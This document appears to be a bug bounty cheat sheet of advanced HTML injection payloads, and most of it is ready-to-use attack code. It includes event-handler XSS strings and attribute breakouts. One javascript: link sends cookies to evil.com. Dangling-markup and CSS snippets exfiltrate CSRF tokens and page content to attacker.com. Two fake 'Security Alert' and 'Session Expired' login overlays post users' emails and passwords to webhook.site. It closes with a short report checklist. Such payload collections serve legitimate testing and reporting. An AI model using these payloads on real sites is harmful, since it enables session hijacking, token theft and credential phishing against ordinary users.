# Advanced HTML Injection Payloads

These payloads demonstrate higher-impact attack scenarios and XSS escalation attempts.

---

## JavaScript Event Handler Payloads
*Attempt to escalate HTML injection to XSS*

```html
<!-- Image events -->
<img src=x onerror=alert(1)>
<img src=x onerror=alert(document.cookie)>
<img src=x onerror=alert(document.domain)>

<!-- Body/SVG events -->
<body onload=alert(1)>
<svg onload=alert(1)>

<!-- Focus events (no click needed) -->
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>

<!-- Mouse events -->
<div onmouseover=alert(1)>Hover me</div>
<a href="#" onclick=alert(1)>Click me</a>

<!-- HTML5 specific -->
<details open ontoggle=alert(1)>
<video><source onerror=alert(1)></video>
<audio src=x onerror=alert(1)>
```

---

## Attribute Injection
*When input lands inside an HTML attribute*

If your input appears as:
```html
<input value="YOUR_INPUT_HERE">
<a href="YOUR_INPUT_HERE">
<img src="YOUR_INPUT_HERE">
```

Use these to break out:
```html
"><b>injected</b>
"><h1>test</h1>
"><img src=x onerror=alert(1)>
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
" onfocus="alert(1)" autofocus="
```

---

## HTML5 Tag Payloads
*Often missed by older WAF rules*

```html
<details open ontoggle=alert(1)>
<dialog open>Injected Dialog Content</dialog>
<template><h1>Injected via template</h1></template>
<object data="https://attacker.com/evil.html"></object>
<embed src="https://attacker.com/content">
<keygen autofocus onfocus=alert(1)>
```

---

## JavaScript Protocol in href

```html
<a href="javascript:alert(1)">Click me</a>
<a href="JaVaScRiPt:alert(1)">Click me</a>
<a href="javascript:void(document.location='https://evil.com/?c='+document.cookie)">Click</a>
```

---

## Dangling Markup Injection
*When full tag injection is blocked but partial injection works*

Useful for stealing page content to bypass CSP:

```html
<!-- Opens an attribute that "sucks in" page content below it -->
<img src='https://attacker.com/?data=

<!-- Steals form fields -->
<form action="https://attacker.com/steal">
```

**How it works:** The opened tag attribute captures everything until the next matching quote, potentially sending sensitive page content (CSRF tokens, email addresses) to the attacker.

---

## CSS Data Exfiltration
*Steal input values without JavaScript*

```html
<style>
/* Steals CSRF token character by character */
input[name="csrf"][value^="a"]{background:url(https://attacker.com/?c=a)}
input[name="csrf"][value^="b"]{background:url(https://attacker.com/?c=b)}
input[name="csrf"][value^="c"]{background:url(https://attacker.com/?c=c)}
/* ... repeat for all characters */
</style>
```

**Use case:** Exfiltrate hidden CSRF tokens even when JavaScript is blocked.

---

## Stored HTML Injection PoC Template

For **maximum impact** in bug bounty reports, use stored injection when available:

```html
<!-- Step 1: Inject into stored field (profile bio, comment, username) -->
<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:9999;display:flex;align-items:center;justify-content:center">
  <div style="background:white;padding:40px;border-radius:8px;width:350px;text-align:center;font-family:Arial">
    <h2 style="color:#cc0000">⚠️ Security Alert</h2>
    <p style="color:#333;margin:15px 0">Your account requires immediate verification</p>
    <form action="https://webhook.site/YOUR-ID" method="POST">
      <input type="email" name="email" placeholder="Email" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
      <input type="password" name="pass" placeholder="Password" style="width:100%;padding:10px;margin:5px 0;border:1px solid #ddd;border-radius:4px;box-sizing:border-box">
      <button style="width:100%;padding:12px;background:#cc0000;color:white;border:none;border-radius:4px;margin-top:10px;cursor:pointer;font-size:16px">Verify Now</button>
    </form>
  </div>
</div>
```

---

## Combining Payloads for Maximum Impact

**iframe + fake form inside it:**
```html
<iframe srcdoc='
  <form action="https://webhook.site/YOUR-ID" method="POST" style="font-family:Arial;padding:20px">
    <h3>Session Expired</h3>
    <input type="text" name="u" placeholder="Username"><br><br>
    <input type="password" name="p" placeholder="Password"><br><br>
    <input type="submit" value="Login">
  </form>
' width="400" height="200" frameborder="0"></iframe>
```

---

## PoC Impact Checklist

When writing your bug bounty report, demonstrate:

- [ ] Payload renders in browser (screenshot)
- [ ] Payload is unencoded in page source (screenshot)  
- [ ] Attack scenario is clearly described
- [ ] Webhook.site shows received data (for form injection PoC)
- [ ] For stored: show it persists after logout/re-login
- [ ] CVSS score calculation included
- [ ] Remediation recommendation included
